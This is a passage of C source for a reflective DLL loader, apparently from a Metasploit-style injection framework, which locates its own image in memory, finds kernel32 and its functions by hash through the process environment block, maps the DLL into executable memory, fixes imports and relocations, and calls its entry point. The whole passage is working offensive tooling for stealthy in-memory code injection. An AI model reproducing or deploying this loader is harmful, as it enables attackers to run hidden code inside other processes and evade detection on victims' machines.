DLLEXPORT UINT_PTR WINAPI ReflectiveLoader( VOID )
#endif
{
	// the functions we need
	LOADLIBRARYA pLoadLibraryA;
	GETPROCADDRESS pGetProcAddress;
	VIRTUALALLOC pVirtualAlloc;
	VIRTUALLOCK pVirtualLock;
	OUTPUTDEBUG pOutputDebug;

	USHORT usCounter;

	// the initial location of this image in memory
	UINT_PTR uiLibraryAddress;
	// the kernels base address and later this images newly loaded base address
	UINT_PTR uiBaseAddress;

	// variables for processing the kernels export table
	UINT_PTR uiAddressArray;
	UINT_PTR uiNameArray;
	UINT_PTR uiExportDir;
	UINT_PTR uiNameOrdinals;
	DWORD dwHashValue;

	// variables for loading this image
	UINT_PTR uiHeaderValue;
	UINT_PTR uiValueA;
	UINT_PTR uiValueB;
	UINT_PTR uiValueC;
	UINT_PTR uiValueD;
	UINT_PTR uiValueE;

	register UINT_PTR inspect;

	// STEP 0: calculate our images current base address
	// we will start searching backwards from our current EIP
#ifdef _WIN64
	uiLibraryAddress = eip();
#else
	__asm {
		call geteip
geteip:
		pop uiLibraryAddress
	}

#endif

	// loop through memory backwards searching for our images base address
	// we dont need SEH style search as we shouldnt generate any access violations with this
	while( TRUE )
	{
		if( ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_magic == IMAGE_DOS_SIGNATURE )
		{
			uiHeaderValue = ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
			// some x64 dll's can trigger a bogus signature (IMAGE_DOS_SIGNATURE == 'POP r10'),
			// we sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.
			if( uiHeaderValue >= sizeof(IMAGE_DOS_HEADER) && uiHeaderValue < 1024 )
			{
				uiHeaderValue += uiLibraryAddress;
				// break if we have found a valid MZ/PE header
				if( ((PIMAGE_NT_HEADERS)uiHeaderValue)->Signature == IMAGE_NT_SIGNATURE )
					break;
			}
		}
		uiLibraryAddress--;
	}
	
	// STEP 1: process the kernels exports for the functions our loader needs...

	// get the Process Enviroment Block
#ifdef _WIN64
	uiBaseAddress = __readgsqword( 0x60 );	
#else
	uiBaseAddress = __readfsdword( 0x30 );
#endif

	// get the processes loaded modules. ref: http://msdn.microsoft.com/en-us/library/aa813708(VS.85).aspx
	uiBaseAddress = (UINT_PTR)((_PPEB)uiBaseAddress)->pLdr;

	// get the first entry of the InMemoryOrder module list
	uiValueA = (UINT_PTR)((PPEB_LDR_DATA)uiBaseAddress)->InMemoryOrderModuleList.Flink;
	while( uiValueA )
	{
		// get pointer to current modules name (unicode string)
		uiValueB = (UINT_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.pBuffer;
		// set bCounter to the length for the loop
		usCounter = ((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.Length;
		// clear uiValueC which will store the hash of the module name
		uiValueC = 0;
		// compute the hash of the module name...
		do
		{
			uiValueC = ror( (DWORD)uiValueC );
			// normalize to uppercase if the module name is in lowercase
			if( *((BYTE *)uiValueB) >= 'a' )
				uiValueC += *((BYTE *)uiValueB) - 0x20;
			else
				uiValueC += *((BYTE *)uiValueB);
			uiValueB++;
		} while( --usCounter );
		// compare the hash with that of kernel32.dll
		if( (DWORD)uiValueC == KERNEL32DLL_HASH )
		{
			// get this modules base address
			uiBaseAddress = (UINT_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;
			break;
		}
		// get the next entry
		uiValueA = DEREF( uiValueA );
	}

	// get the VA of the modules NT Header
	uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

	// uiNameArray = the address of the modules export directory entry
	uiNameArray = (UINT_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

	// get the VA of the export directory
	uiExportDir = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );

	// get the VA for the array of name pointers
	uiNameArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNames );
			
	// get the VA for the array of name ordinals
	uiNameOrdinals = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfNameOrdinals );

	usCounter = 5;

	// loop while we still have imports to find
	while( usCounter > 0 )
	{
		// compute the hash values for this function name
		dwHashValue = hash( (char *)( uiBaseAddress + DEREF_32( uiNameArray ) )  );
				
		// if we have found a function we want we get its virtual address
		if( dwHashValue == LOADLIBRARYA_HASH || dwHashValue == GETPROCADDRESS_HASH || dwHashValue == VIRTUALALLOC_HASH || dwHashValue == VIRTUALLOCK_HASH || dwHashValue == OUTPUTDEBUG_HASH )
		{
			// get the VA for the array of addresses
			uiAddressArray = ( uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );

			// use this functions name ordinal as an index into the array of name pointers
			uiAddressArray += ( DEREF_16( uiNameOrdinals ) * sizeof(DWORD) );

			// store this functions VA
			if( dwHashValue == LOADLIBRARYA_HASH )
				pLoadLibraryA = (LOADLIBRARYA)( uiBaseAddress + DEREF_32( uiAddressArray ) );
			else if( dwHashValue == GETPROCADDRESS_HASH )
				pGetProcAddress = (GETPROCADDRESS)( uiBaseAddress + DEREF_32( uiAddressArray ) );
			else if( dwHashValue == VIRTUALALLOC_HASH )
				pVirtualAlloc = (VIRTUALALLOC)( uiBaseAddress + DEREF_32( uiAddressArray ) );
			else if( dwHashValue == VIRTUALLOCK_HASH )
				pVirtualLock = (VIRTUALLOCK)( uiBaseAddress + DEREF_32( uiAddressArray ) );
			else if( dwHashValue == OUTPUTDEBUG_HASH )
				pOutputDebug = (OUTPUTDEBUG)( uiBaseAddress + DEREF_32( uiAddressArray ) );
			// decrement our counter
			usCounter--;
		}

		// get the next exported function name
		uiNameArray += sizeof(DWORD);

		// get the next exported function name ordinal
		uiNameOrdinals += sizeof(WORD);
	}

	// STEP 2: load our image into a new permanent location in memory...

	// get the VA of the NT Header for the PE to be loaded
	uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

	// allocate all the memory for the DLL to be loaded into. we can load at any address because we will  
	// relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
	uiBaseAddress = (UINT_PTR)pVirtualAlloc( NULL, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );
	
	// prevent our image from being swapped to the pagefile
	pVirtualLock((LPVOID)uiBaseAddress, ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfImage);

	// we must now copy over the headers
	uiValueA = ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.SizeOfHeaders;
	uiValueB = uiLibraryAddress;
	uiValueC = uiBaseAddress;
	__movsb( (PBYTE)uiValueC, (PBYTE)uiValueB, uiValueA );


	// STEP 3: load in all of our sections...

	// uiValueA = the VA of the first section
	uiValueA = ( (UINT_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader + ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.SizeOfOptionalHeader );

	uiValueE = ((PIMAGE_NT_HEADERS)uiHeaderValue)->FileHeader.NumberOfSections;

	// iterate through all sections, loading them into memory.
	while( uiValueE-- )
	{
		// uiValueB is the VA for this section
		uiValueB = ( uiBaseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress );

		// uiValueC if the VA for this sections data
		uiValueC = ( uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData );

		// copy the section over
		uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData;
		__movsb( (PBYTE)uiValueB, (PBYTE)uiValueC, uiValueD );

		// get the VA of the next section
		uiValueA += sizeof( IMAGE_SECTION_HEADER );
	}


	// STEP 4: process our images import table...


	// uiValueB = the address of the import directory
	uiValueB = (UINT_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];
	uiValueC = ( uiBaseAddress + (UINT_PTR)((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );

	// iterate through all imports until a null RVA is found (Characteristics is mis-named)
	while( ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Characteristics )
	{
		/*
		pOutputDebug("Loading library: ");
		pOutputDebug((LPCSTR)( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name ));
		pOutputDebug("\n");
		*/

		// use LoadLibraryA to load the imported module into memory
		uiLibraryAddress = (UINT_PTR)pLoadLibraryA( (LPCSTR)( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name ) );

		if (! uiLibraryAddress) {
			//pOutputDebug("Loading library FAILED\n");
			// get the next import
			uiValueC += sizeof( IMAGE_IMPORT_DESCRIPTOR );
			continue;
		}

		// uiValueD = VA of the OriginalFirstThunk
		uiValueD = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk );
	
		// uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
		uiValueA = ( uiBaseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk );

		// itterate through all imported functions, importing by ordinal if no name present
		while( DEREF(uiValueA) )
		{
			// sanity check uiValueD as some compilers only import by FirstThunk
			if( uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG )
			{
				// get the VA of the modules NT Header
				uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

				// uiNameArray = the address of the modules export directory entry
				uiNameArray = (UINT_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

				// get the VA of the export directory
				uiExportDir = ( uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress );

				// get the VA for the array of addresses
				uiAddressArray = ( uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->AddressOfFunctions );

				// use the import ordinal (- export ordinal base) as an index into the array of addresses
				uiAddressArray += ( ( IMAGE_ORDINAL( ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal ) - ((PIMAGE_EXPORT_DIRECTORY )uiExportDir)->Base ) * sizeof(DWORD) );

				// patch in the address for this imported function
				DEREF(uiValueA) = ( uiLibraryAddress + DEREF_32(uiAddressArray) );
			}
			else
			{
				// get the VA of this functions import by name struct
				uiValueB = ( uiBaseAddress + DEREF(uiValueA) );
	/*
				pOutputDebug("Resolving function: ");
				pOutputDebug((LPCSTR)( (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name ));
				pOutputDebug("\n");
	*/

				// use GetProcAddress and patch in the address for this imported function
				DEREF(uiValueA) = (UINT_PTR)pGetProcAddress( (HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name );	

			}
			// get the next imported function
			uiValueA += sizeof( UINT_PTR );
			if( uiValueD )
				uiValueD += sizeof( UINT_PTR );
		}

		// get the next import
		uiValueC += sizeof( IMAGE_IMPORT_DESCRIPTOR );
	}


	// STEP 5: process all of our images relocations...

	// calculate the base address delta and perform relocations (even if we load at desired image base)
	uiLibraryAddress = uiBaseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;
	
	// uiValueB = the address of the relocation directory
	uiValueB = (UINT_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];

	// check if there are any relocations present
	if( ((PIMAGE_DATA_DIRECTORY)uiValueB)->Size )
	{
		// uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
		uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );

		// and we iterate through all entries...
		while( ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock )
		{
			// uiValueA = the VA for this relocation block
			uiValueA = ( uiBaseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress );

			// uiValueB = number of entries in this relocation block
			uiValueB = ( ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) ) / sizeof( IMAGE_RELOC );

			// uiValueD is now the first entry in the current relocation block
			uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);

			// we itterate through all the entries in the current block...
			while( uiValueB-- )
			{
				// perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
				// we dont use a switch statement to avoid the compiler building a jump table
				// which would not be very position independent!
				if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64 )
					*(UINT_PTR *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
				else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW )
					*(DWORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;
				else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH )
					*(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
				else if( ((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW )
					*(WORD *)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);

				// get the next entry in the current relocation block
				uiValueD += sizeof( IMAGE_RELOC );
			}

			// get the next entry in the relocation directory
			uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
		}
	}

	// STEP 6: process the images exception directory if it has one (PE32+ for x64)
/*
	// uiValueB = the address of the relocation directory
	uiValueB = (UINT_PTR)&((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXCEPTION ];
	// check if their are any exception etries present
	if( ((PIMAGE_DATA_DIRECTORY)uiValueB)->Size )
	{
		// get the number of entries
		uiValueA = ((PIMAGE_DATA_DIRECTORY)uiValueB)->Size / sizeof( IMAGE_RUNTIME_FUNCTION_ENTRY );
		
		// uiValueC is now the first entry (IMAGE_RUNTIME_FUNCTION_ENTRY)
		uiValueC = ( uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress );

		// itterate through all entries
		while( uiValueA-- )
		{
			//((IMAGE_RUNTIME_FUNCTION_ENTRY)uiValueC).BeginAddress
		
			// get the next entry
			uiValueC += sizeof( IMAGE_RUNTIME_FUNCTION_ENTRY );
		}
	}
*/
	// STEP 7: call our images entry point

	// uiValueA = the VA of our newly loaded DLL/EXE's entry point
	uiValueA = ( uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint );

	// call our respective entry point, fudging our hInstance value
#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
	// if we are injecting a DLL via LoadRemoteLibraryR we call DllMain and pass in our parameter (via the DllMain lpReserved parameter)
	((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, lpParameter );
#else
	// if we are injecting an DLL via a stub we call DllMain with no parameter
	((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, NULL );
#endif

	// STEP 8: return our new entry point address so whatever called us can call DLL_METASPLOIT_ATTACH/DLL_METASPLOIT_DETACH
	return uiValueA;
}